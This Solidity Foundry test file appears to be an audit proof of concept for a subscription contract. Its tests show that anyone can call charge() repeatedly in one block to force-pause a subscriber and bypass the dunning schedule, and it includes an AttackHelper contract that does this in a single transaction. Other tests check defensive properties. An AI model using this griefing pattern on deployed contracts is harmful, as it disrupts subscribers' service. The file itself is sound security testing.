// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SubscriptionManager} from "../src/SubscriptionManager.sol";
import {FeeRouter} from "../src/FeeRouter.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";
import {MockPermit2} from "./mocks/MockPermit2.sol";

/// @title PermissionlessFailureTest
/// @notice PROOF OF CONCEPT: Demonstrates the H-1 permissionless failure attack.
///
/// These tests ASSERT THE CURRENT BUG EXISTS. When the fix lands (adding a
/// cooldown in _recordFailure), these tests should be INVERTED into regression
/// tests that verify the attack no longer works:
///   - testPermissionlessFailureAttack: should revert or return early on repeated calls
///   - testPermissionlessFailureOneTransaction: attack helper should fail
///
/// The testFullyFundedSubscriberIsSafe and testGasLimitedCallCannotForceFailure
/// tests verify defensive properties and should continue to pass after the fix.
///
/// @dev Demonstrates that anyone can force a subscription to auto-pause
///      by calling charge() repeatedly in a single block when the pull fails.
///      This bypasses the off-chain 1/3/7-day dunning schedule entirely.
contract PermissionlessFailureTest is Test {
    MockUSDC usdc;
    FeeRouter router;
    SubscriptionManager manager;
    MockPermit2 permit2;

    address merchant = makeAddr("merchant");
    address subscriber = makeAddr("subscriber");
    address attacker = makeAddr("attacker");
    address treasury = makeAddr("treasury");

    uint256 constant PRICE = 10_000_000; // $10.00
    uint256 constant CYCLE = 1 days;

    function setUp() public {
        usdc = new MockUSDC();
        router = new FeeRouter(address(usdc), treasury);
        permit2 = new MockPermit2();
        manager = new SubscriptionManager(address(usdc), address(router), address(permit2));

        // Fund subscriber with enough for subscribe + a few charges
        usdc.mint(subscriber, PRICE * 5);
    }

    /// @notice Demonstrates the core vulnerability: anyone can call charge()
    ///         2*maxFailed times in a single block to auto-pause a subscription
    ///         the moment its pull would fail, bypassing the dunning schedule.
    function testPermissionlessFailureAttack() public {
        // Merchant creates a plan with maxFailed=2 (auto-pause at 4 failures)
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        // Subscriber approves exactly 2 cycles and subscribes
        // After subscribe (which bills cycle 1), they have 1 cycle of allowance left
        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE * 2);
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        // Verify: ACTIVE, 1 charge done, next charge in 1 day
        (, , , , , , uint256 chargeCount, SubscriptionManager.Status status) = manager.subscriptions(subId);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.ACTIVE));
        assertEq(chargeCount, 1);

        // Fast-forward to the next billing date
        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // Subscriber's second charge succeeds (they have allowance for 1 more)
        manager.charge(subId);
        (, , , , , , chargeCount, status) = manager.subscriptions(subId);
        assertEq(chargeCount, 2);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.ACTIVE));

        // Fast-forward to the third billing date
        // Now subscriber has NO allowance left - pull will fail
        (, , , nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // === THE ATTACK ===
        // An attacker (or anyone) can now call charge() 4 times in one block
        // to push the subscription from ACTIVE -> PAST_DUE -> PAUSED
        // This bypasses the intended 1/3/7-day dunning retry schedule!

        vm.startPrank(attacker);
        
        // Call 1: fails, failedAttempts = 1
        manager.charge(subId);
        uint64 failed;
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 1);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.ACTIVE));

        // Call 2: fails, failedAttempts = 2 -> PAST_DUE (>= maxFailed)
        manager.charge(subId);
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 2);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAST_DUE));

        // Call 3: fails, failedAttempts = 3
        manager.charge(subId);
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 3);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAST_DUE));

        // Call 4: fails, failedAttempts = 4 -> PAUSED (>= 2*maxFailed)
        manager.charge(subId);
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 4);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAUSED));

        vm.stopPrank();

        // The subscription is now PAUSED in a SINGLE BLOCK
        // The off-chain 1/3/7-day dunning schedule was completely bypassed
        // The subscriber never had a chance to top up their allowance
    }

    /// @notice Shows the attack can be done in a single transaction via a helper
    function testPermissionlessFailureOneTransaction() public {
        // Setup: same as above
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE); // Only enough for subscribe
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        // Fast-forward to second billing - pull will fail
        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // Deploy attack helper and execute in one tx
        AttackHelper helper = new AttackHelper(manager);
        helper.forceAutoPause(subId, 4); // 2*maxFailed = 4

        // Verify: subscription is now PAUSED
        uint64 failed;
        SubscriptionManager.Status status;
        (, , , , failed, , , status) = manager.subscriptions(subId);
        assertEq(failed, 4);
        assertEq(uint256(status), uint256(SubscriptionManager.Status.PAUSED));
    }

    /// @notice Confirms that a fully-funded subscriber cannot be attacked
    ///         (the charge succeeds, nextChargeAt advances, further charges revert)
    function testFullyFundedSubscriberIsSafe() public {
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        // Subscriber approves plenty
        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE * 10);
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // First charge succeeds
        vm.prank(attacker);
        manager.charge(subId);

        // Second charge in the same block reverts (not due yet)
        vm.prank(attacker);
        vm.expectRevert(SubscriptionManager.NotChargeable.selector);
        manager.charge(subId);
    }

    /// @notice Tests the 63/64 rule: can an attacker force the try/catch to fail
    ///         by providing insufficient gas, even for a funded subscriber?
    ///
    /// Why this matters:
    /// - The 63/64 rule means external calls receive at most 63/64 of remaining gas
    /// - If the inner transferFrom runs out of gas, the try/catch catches it
    /// - But the caller keeps only ~1/64 of what it forwarded
    /// - That ~1/64 is NOT enough to finish _recordFailure's storage writes + event
    /// - So the whole transaction reverts (no failure recorded)
    ///
    /// CAVEAT: This test uses MockUSDC. Real USDC's proxy pattern makes the inner
    /// call more expensive, which actually widens the safety margin (less gas left
    /// for the caller after a failed inner call).
    function testGasLimitedCallCannotForceFailure() public {
        vm.prank(merchant);
        uint256 planId = manager.createPlan(PRICE, CYCLE, 0, 0, 2);

        vm.startPrank(subscriber);
        usdc.approve(address(manager), PRICE * 100); // Plenty of allowance
        uint256 subId = manager.subscribe(planId, bytes32(0));
        vm.stopPrank();

        (, , , uint64 nextChargeAt, , , , ) = manager.subscriptions(subId);
        vm.warp(nextChargeAt);

        // First, measure how much gas a successful charge() needs
        uint256 gasBefore = gasleft();
        manager.charge(subId);
        uint256 successGas = gasBefore - gasleft();

        // Sweep over a range of gas limits: from well below to above success cost
        // Fine-grained around the region where the inner transferFrom would run out
        uint256[] memory gasLimits = new uint256[](20);
        gasLimits[0] = 10_000;           // Way too low
        gasLimits[1] = 20_000;
        gasLimits[2] = 30_000;
        gasLimits[3] = 40_000;
        gasLimits[4] = 50_000;
        gasLimits[5] = 60_000;
        gasLimits[6] = 70_000;
        gasLimits[7] = 80_000;
        gasLimits[8] = 90_000;
        gasLimits[9] = 100_000;
        gasLimits[10] = successGas / 2;   // Half of success cost
        gasLimits[11] = successGas * 2 / 3;
        gasLimits[12] = successGas * 3 / 4;
        gasLimits[13] = successGas * 7 / 8;
        gasLimits[14] = successGas - 5000; // Just under success
        gasLimits[15] = successGas - 1000;
        gasLimits[16] = successGas;        // Exactly success cost
        gasLimits[17] = successGas + 5000; // Just over
        gasLimits[18] = successGas + 20000;
        gasLimits[19] = successGas * 2;    // Plenty

        for (uint256 i = 0; i < gasLimits.length; i++) {
            // Snapshot state before each attempt
            uint256 snapshot = vm.snapshotState();

            // Warp to next billing cycle
            vm.warp(nextChargeAt + CYCLE);

            // Record state before the call
            uint64 failedBefore;
            uint256 chargesBefore;
            (, , , , failedBefore, , chargesBefore, ) = manager.subscriptions(subId);

            // Try to call charge() with this gas limit
            (bool success,) = address(manager).call{gas: gasLimits[i]}(
                abi.encodeCall(manager.charge, (subId))
            );

            // Check state after
            uint64 failedAfter;
            uint256 chargesAfter;
            (, , , , failedAfter, , chargesAfter, ) = manager.subscriptions(subId);

            // CRITICAL ASSERTION: No gas limit should ever record a failure
            // for a fully-funded subscriber
            assertEq(failedAfter, 0, string.concat(
                "Gas limit ", vm.toString(gasLimits[i]),
                " recorded a failure for funded subscriber"
            ));

            if (success) {
                // Charge succeeded, chargeCount should have increased by 1
                assertEq(chargesAfter, chargesBefore + 1, "Charge count should increase on success");
            } else {
                // Call reverted entirely - state should be unchanged
                // (The 63/64 rule: caller keeps ~1/64, not enough for _recordFailure)
                assertEq(chargesAfter, chargesBefore, "Charge count should stay same on revert");
            }

            // Always revert to snapshot to test each gas limit independently
            vm.revertToState(snapshot);
        }
    }
}

/// @notice Helper contract to demonstrate the attack in a single transaction
contract AttackHelper {
    SubscriptionManager immutable manager;

    constructor(SubscriptionManager _manager) {
        manager = _manager;
    }

    function forceAutoPause(uint256 subId, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            manager.charge(subId);
        }
    }
}
